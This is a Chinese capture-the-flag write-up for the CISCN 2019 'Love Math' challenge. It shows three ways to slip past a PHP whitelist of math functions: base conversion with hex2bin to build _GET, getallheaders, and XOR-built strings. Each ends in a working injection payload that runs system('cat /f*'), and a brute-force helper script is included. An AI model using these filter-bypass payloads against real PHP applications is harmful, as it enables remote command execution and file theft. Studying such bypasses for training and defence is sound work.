# [CISCN 2019 初赛]Love Math 通过进制转换执行命令

**目录**

[TOC]





这道题也是很有意思！

通过规定白名单和黑名单 指定了函数为数学函数 并且参数也只能是规定在白名单中的参数

我们首先要了解 通过进制转换执行命令的第一时间就是想到 hex2bin/bin2hex

## hex2bin    bin2hex

这个函数可以将十六进制转换为ASCII码 从而实现数字到字符



<img src="https://i-blog.csdnimg.cn/blog_migrate/b5eecb6249c1be2d26d60cb48e66b394.png" alt="" style="max-height:259px; box-sizing:content-box;" />


所以我们可以通过这里的

接着我们需要了解 base_convert()函数

## base_convert

这函数是可以将任意进制进行互相转换

我们这里给出例子



<img src="https://i-blog.csdnimg.cn/blog_migrate/d4f9d2b19d28c38c279b15a82fcf9856.png" alt="" style="max-height:245px; box-sizing:content-box;" />


这里的hex2bin是36进制 所以这里可以将十进制转换为字符形式

## 动态函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/da2b2b643670235879322d43b902a7c1.png" alt="" style="max-height:183px; box-sizing:content-box;" />


## 第一种解法  通过get获取参数

我们无法实现system(cat /flag) 因为36进制不接受特殊的符号 例如空格 所以我们无法直接获取到指令

但是我们换位思考一下

```bash
$a($b)
 
$a=system
 
$b=cat /f*
 
最后是不是就是 system(cat /f*)
```

现在问题在于我们如何接收到参数

这里主要就是通过GET POST方式

```cobol
_GET[1](_GET[2])
 
1=system
 
2=cat /f*
 
是不是就等于 system(cat /f*)
```

现在问题转换为如何传递字符了

因为_GET[]都不在白名单中 甚至[]还在黑名单中

这里就涉及绕过了

### 绕过

首先[] 可以通过  {}绕过 很简单

其次_GET 我们可以通过数学编码

我们上面了解的hex2bin 就是可以将十六进制转变为ASCII

这样我们就可以构造_GET了

首先通过 bin2hex转变



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a98c0c90f721787c65f88a3a4141240.png" alt="" style="max-height:242px; box-sizing:content-box;" />


得到16进制

但是这里面存在字符



<img src="https://i-blog.csdnimg.cn/blog_migrate/103c0d4e8a2b5ddaa30f0659fbfcaa79.png" alt="" style="max-height:263px; box-sizing:content-box;" />


发现正则过滤了字母 所以我们要将他换为全数字 就是十进制



<img src="https://i-blog.csdnimg.cn/blog_migrate/38a3d8051a9dc2622d5111269fd23c00.png" alt="" style="max-height:209px; box-sizing:content-box;" />


然后通过dechex转换



<img src="https://i-blog.csdnimg.cn/blog_migrate/228fe6e8466a3313c61897790b37a88a.png" alt="" style="max-height:224px; box-sizing:content-box;" />


最后就是hex2bin的了 我们只需要将其的10进制转换为36进制即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/43eff121a010ea4c6a6a93a607e4c008.png" alt="" style="max-height:266px; box-sizing:content-box;" />




```cobol
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /*
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/05a3639ab4461a1722080c437a377915.png" alt="" style="max-height:140px; box-sizing:content-box;" />


我给大家简化一下

```cobol
c=$pi=hex2bin(5f474554) 这里相当于 c=$pi=_GET
 
($$pi){pi}  这里相当于 $_GET{pi}
(($$pi){abs})  这里相当于 ($_GET{abs})
 
组合起来 $_GET{pi}($_GET{abs})
 
 
pi=system  abs=cat /f*
 
就可以是 system(cat /f*)
```

## 第二种解法  读取请求头

首先 我们构造 get很绕很麻烦 我们能不能直接执行命令

既然我们无法读取get的内容 那么我们直接接受请求头呢

这里就存在一个函数

### getallheaders

```undefined
getallheaders
```

可以接受请求头



<img src="https://i-blog.csdnimg.cn/blog_migrate/43c9fd77bca23d8c93b2d2b8acf2f271.png" alt="" style="max-height:639px; box-sizing:content-box;" />


我们直接使用 exec(getallheaders) 来执行这个命令

这里还需要了了解一个知识点

### echo a,b

```less
echo a,b
 
ab都会输出
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/008aacd4b3086f99eb22156d83752337.png" alt="" style="max-height:276px; box-sizing:content-box;" />


所以我们可以直接通过 exec a,b来执行

通过36进制换算

```cobol
c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
```

然后通过1:cat /f*访问即可

这里getallheaders需要30进制



<img src="https://i-blog.csdnimg.cn/blog_migrate/82418eed8dbda7a329a28a0550b6f7f7.png" alt="" style="max-height:404px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/bc78cb67569577be6e484a01cb23d657.png" alt="" style="max-height:601px; box-sizing:content-box;" />


## 第三种解法 异或获得更多字符

我们能不能直接获取flag呢

我们通过异或来获取更多的字符串

我们来编写php代码

```php
<?php
$pl=['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($pl);$k++){
    for($i=0;$i < 9;$i++){
        for($j=1;$j <= 9; $j++){
            $exp=$pl[$k]^$i.$j;
            echo($pl[$k]."^".$i.$j."===>".$exp);
            echo "        ";
        }
    }
}
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/91d1e860a3b26a5df7c1fec658f06914.png" alt="" style="max-height:123px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/bf82749a9bbda83b38a3343760ad4f58.png" alt="" style="max-height:65px; box-sizing:content-box;" />


获取_GET了

直接和第一个一样即可

```cobol
?c=$pi=(mt_srand^(2).(3)).(tanh^(1).(5));$$pi{1}($$pi{0})&1=system&0=cat /f*
```